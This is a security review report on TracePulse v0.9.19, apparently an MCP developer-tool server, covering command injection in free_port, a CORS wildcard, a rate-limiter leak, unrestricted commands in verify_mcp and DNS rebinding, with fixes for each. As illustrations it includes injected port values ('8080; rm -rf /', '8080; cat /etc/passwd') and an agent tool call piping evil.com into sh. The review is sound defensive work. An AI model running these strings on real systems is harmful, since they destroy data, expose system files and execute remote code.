## Summary

TracePulse v0.9.19 maintains a strong security posture. The previously-reported `bash` allowlist bypass (SRR-003 H-001) remains open but is mitigated by the shell metacharacter check. This review found one new HIGH finding (command injection in `free_port`) and confirms several previously-reported MEDIUM issues remain open.

## Findings

### H-001: Command injection in `free_port` via unvalidated port parameter (HIGH)

**File:** `src/tools/free-port.ts:47-49`
**Evidence:**
```typescript
const port = args.port as number | undefined;
// ...
const pid = execSync(`lsof -ti:${port} 2>/dev/null`, { encoding: "utf-8" }).trim();
execSync(`kill -9 ${pid} 2>/dev/null`);
```
**Risk:** The `port` parameter is cast as `number` but never validated. If the MCP client sends a string like `"8080; rm -rf /"`, the `as number` cast does NOT convert it — TypeScript type assertions are erased at runtime. The value is interpolated directly into `execSync()` shell commands.
**Confidence:** CONFIRMED
**Attack scenario:** A malicious or buggy MCP client sends `{ port: "8080; cat /etc/passwd" }`. The `as number` cast is a no-op at runtime. The string is interpolated into `execSync(\`lsof -ti:${port}\`)`, executing arbitrary commands.
**Regression test exists:** No

**Remediation:**
1. **Recommended:** Validate port is a finite integer in range 1-65535 before use. Use `execFile` instead of `execSync` to avoid shell interpretation.
2. Alternative: Convert to number with `Number(args.port)` and reject NaN.

### M-001: CORS wildcard on REST API endpoints (MEDIUM)

**File:** `src/transport/http-transport.ts:78`
**Evidence:**
```typescript
"Access-Control-Allow-Origin": "*",
```
**Risk:** The REST API (when enabled via `--http`) sets `Access-Control-Allow-Origin: *` on all responses. While the server binds to localhost only, any website the user visits can make requests to `http://127.0.0.1:9800/api/*` and read responses (error data, session info, audit trail).
**Confidence:** CONFIRMED
**Mitigation:** Server is localhost-only, API key auth is available but optional.
**Recommendation:** Replace `*` with explicit localhost origins (`http://localhost:*`, `http://127.0.0.1:*`). When API key is set, omit CORS header entirely.

### M-002: Rate limiter memory leak — no window eviction (MEDIUM)

**File:** `src/transport/rest-auth.ts:62-77`
**Evidence:** The `windows` Map grows unboundedly. Each unique `clientId` adds an entry that is never removed, even after the window expires.
**Risk:** In long-running sessions with many unique clients (e.g., different API keys, rotating IPs), memory grows without bound.
**Confidence:** CONFIRMED
**Recommendation:** Add periodic eviction of expired windows (e.g., every 60s, delete entries where `now - start > windowMs`).

### M-003: `verify_mcp` accepts arbitrary commands without allowlist (MEDIUM)

**File:** `src/tools/verify-mcp.ts:56-60`
**Evidence:** The `command` parameter is passed directly to `spawn(command, { shell: true })` with no allowlist check, no metacharacter rejection, and no validation.
**Risk:** Unlike `run_and_watch` which has an allowlist, `verify_mcp` allows arbitrary command execution. An agent could be tricked into calling `verify_mcp({ command: "curl evil.com | sh" })`.
**Confidence:** CONFIRMED
**Mitigation:** The tool's purpose is to test MCP servers, which are inherently arbitrary commands. The risk is that the agent calls it with a non-MCP command.
**Recommendation:** Add the same shell metacharacter check used in `run_and_watch` (reject `;`, `&`, `|`, `$`, backticks). MCP server commands don't need shell operators.

### L-001: DNS rebinding risk on probe URL validation (LOW)

**File:** `src/tools/register-probe.ts:172-175`
**Evidence:** Hostname check uses string comparison (`host !== "localhost"`). A DNS rebinding attack could register a probe for `localhost.evil.com` which initially resolves to 127.0.0.1 (passing the check) then rebinds to an internal IP.
**Risk:** Low in practice — probes only make HTTP GET/POST requests, and the server is a dev tool not exposed to untrusted networks.
**Confidence:** NEEDS VALIDATION
**Recommendation:** Resolve the hostname to an IP and validate the IP is in 127.0.0.0/8 or ::1. Previously reported in SRR-003 M-001.
